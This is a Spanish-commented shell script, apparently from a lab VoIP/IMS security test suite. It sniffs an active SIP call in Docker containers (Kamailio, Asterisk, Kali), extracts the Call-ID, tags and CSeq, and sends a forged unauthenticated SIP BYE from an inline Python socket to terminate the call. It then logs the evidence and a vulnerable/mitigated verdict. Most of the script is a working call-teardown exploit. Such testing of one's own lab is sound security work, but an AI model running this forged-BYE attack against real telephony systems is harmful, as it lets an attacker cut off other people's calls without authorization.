#!/bin/sh
# ============================================================================
# v7_bye.sh — V7 Terminación forzada con SIP BYE forjado (sin auth de diálogo).
# Requiere llamada ACTIVA (ej: 1001->1000 echo). Toma Call-ID y tags del
# diálogo (auto-extracción vía tshark o manual) y envía BYE spoofeado.
# Éxito = la llamada cae (0 canales PJSIP en Asterisk).
# Modos: auto (captura 25s y extrae) / manual (pegar valores).
# Uso: ./v7_bye.sh  (pregunta parámetros)
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v7] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}

docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
  || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
mkdir -p results; touch results/hashes.txt 2>/dev/null || true

SRCU=$(ask SRCU "Llamante (From)" "1001")
DSTU=$(ask DSTU "Llamado (To)" "1000")
DOMAIN=$(ask DOMAIN "Dominio IMS" "ims.mnc070.mcc999.3gppnetwork.org")
PCSCF_IP=$(ask PCSCF_IP "IP P-CSCF destino del BYE" "172.20.0.6")
PCSCF_PORT=$(ask PCSCF_PORT "Puerto P-CSCF" "4060")
MODE=$(ask MODE "Modo: auto (capturar diálogo) / manual (pegar valores)" "auto")
TS=$(date -u +%Y%m%dT%H%M%SZ)

CALLID=""; FROMTAG=""; TOTAG=""; CSEQ=""
if [ "$MODE" = "auto" ]; then
  log "1) Inicie AHORA la llamada ($SRCU->$DSTU) y manténgala ~25s; capturando diálogo..."
  docker exec -d kamailio sh -c "timeout 30 tcpdump -i eth0 -w /tmp/v7.pcapng udp port 4060 or udp port 6060 >/tmp/v7cap.log 2>&1"
  sleep 25
  docker exec kamailio sh -c "tshark -r /tmp/v7.pcapng -Y sip -T fields -e sip.Call-ID -e sip.from.tag -e sip.to.tag -e sip.CSeq 2>/dev/null | head -n 5" || true
  CALLID=$(docker exec kamailio sh -c "tshark -r /tmp/v7.pcapng -Y 'sip.Method==INVITE or sip.Status-Code==200' -T fields -e sip.Call-ID 2>/dev/null | head -n 1" | tr -d '\r')
  FROMTAG=$(docker exec kamailio sh -c "tshark -r /tmp/v7.pcapng -Y sip -T fields -e sip.from.tag 2>/dev/null | head -n 1" | tr -d '\r')
  TOTAG=$(docker exec kamailio sh -c "tshark -r /tmp/v7.pcapng -Y 'sip.Status-Code==200' -T fields -e sip.to.tag 2>/dev/null | head -n 1" | tr -d '\r')
  LASTCSEQ=$(docker exec kamailio sh -c "tshark -r /tmp/v7.pcapng -Y sip -T fields -e sip.CSeq 2>/dev/null | grep -a -oE '^[0-9]+' | sort -n | tail -n 1" | tr -d '\r')
  [ -n "${LASTCSEQ:-}" ] && CSEQ=$((LASTCSEQ + 1)) || CSEQ=3
  log "Extraído: Call-ID=${CALLID:-?} From-tag=${FROMTAG:-?} To-tag=${TOTAG:-?} CSeq=$CSEQ"
  [ -n "$CALLID" ] && [ -n "$FROMTAG" ] && [ -n "$TOTAG" ] || {
    log "Auto-extracción incompleta; reintente con llamada activa o use modo manual."; MODE="manual";
  }
fi
if [ "$MODE" = "manual" ]; then
  log "Obtener valores con: tshark en kali/kamailio, filtro 'sip', leer Call-ID y tags del 200 OK."
  [ -n "$CALLID" ] || CALLID=$(ask CALLID "Call-ID del diálogo" "")
  [ -n "$FROMTAG" ] || FROMTAG=$(ask FROMTAG "tag del From (llamante)" "")
  [ -n "$TOTAG" ] || TOTAG=$(ask TOTAG "tag del To (llamado)" "")
  [ -n "$CSEQ" ] || CSEQ=$(ask CSEAV "CSeq a usar (mayor al último visto)" "3")
fi
[ -n "$CALLID" ] && [ -n "$FROMTAG" ] && [ -n "$TOTAG" ] || { log "ERROR: faltan Call-ID/tags"; exit 1; }

BEFORE=$(docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || echo 0)
log "Canales PJSIP antes: $BEFORE (se espera >=1 con llamada activa)"

log "Enviando BYE forjado (From-tag=$FROMTAG To-tag=$TOTAG CSeq=$CSEQ)..."
docker exec -e CALLID="$CALLID" -e FROMTAG="$FROMTAG" -e TOTAG="$TOTAG" -e CSEQ="$CSEQ" \
  -e SRCU="$SRCU" -e DSTU="$DSTU" -e DOMAIN="$DOMAIN" -e PCSCF_IP="$PCSCF_IP" -e PCSCF_PORT="$PCSCF_PORT" \
  kali python3 -c "
import os, socket
callid=os.environ['CALLID']; ftag=os.environ['FROMTAG']; ttag=os.environ['TOTAG']
cseq=os.environ['CSEQ']; src=os.environ['SRCU']; dst=os.environ['DSTU']
dom=os.environ['DOMAIN']; tgt=os.environ['PCSCF_IP']; port=int(os.environ['PCSCF_PORT'])
bye=('BYE sip:%s@%s SIP/2.0\r\n'
 'Via: SIP/2.0/UDP 172.20.0.99:5060;branch=z9hG4bKv7bye\r\n'
 'From: <sip:%s@%s>;tag='+ftag+'\r\n'
 'To: <sip:%s@%s>;tag='+ttag+'\r\n'
 'Call-ID: '+callid+'\r\n'
 'CSeq: '+cseq+' BYE\r\n'
 'Content-Length: 0\r\n\r\n') % (dst, dom, src, dom, dst, dom)
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(bye.encode(), (tgt, port))
print('BYE forjado enviado Call-ID=%s CSeq=%s' % (callid, cseq))
"
sleep 5
AFTER=$(docker exec asterisk asterisk -rx "core show channels" 2>/dev/null | grep -a -c PJSIP || echo 0)
log "Canales activos en Asterisk (0 = llamada terminada = ÉXITO): $AFTER (antes $BEFORE)"

# Evidencia: pcap del diálogo + hash
docker cp kamailio:/tmp/v7.pcapng "/tmp/v7_$TS.pcapng" 2>/dev/null || log "(sin pcap kamailio; se registra solo hash de evento)"
if [ -f "/tmp/v7_$TS.pcapng" ]; then
  cp "/tmp/v7_$TS.pcapng" "results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng"
  H=$(sha256sum "results/v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng" | cut -d' ' -f1)
  echo "$H  v7_bye_${SRCU}-to-${DSTU}_$TS.pcapng  V7  $(date -u +%Y-%m-%dT%H:%M:%SZ)  BYE forjado $SRCU->$DSTU Call-ID $CALLID (canales $BEFORE->$AFTER)" >> results/hashes.txt
else
  echo "no-pcap  v7_bye_${SRCU}-to-${DSTU}_$TS  V7  $(date -u +%Y-%m-%dT%H:%M:%SZ)  BYE forjado Call-ID $CALLID (canales $BEFORE->$AFTER)" >> results/hashes.txt
fi
if [ "$AFTER" = "0" ] && [ "$BEFORE" != "0" ]; then
  log "VEREDICTO: VULNERABLE (llamada terminada por BYE sin auth)."
elif [ "$BEFORE" = "0" ]; then
  log "VEREDICTO: no concluyente (no había llamada activa; repetir con llamada en curso)."
else
  log "VEREDICTO: MITIGADO o falló el BYE (llamada sigue; verificar tags/CSeq y reintentar)."
fi
log "F4 contramedida: verificar tags From/To del diálogo + auth -> se espera 403/481 y llamada en pie."
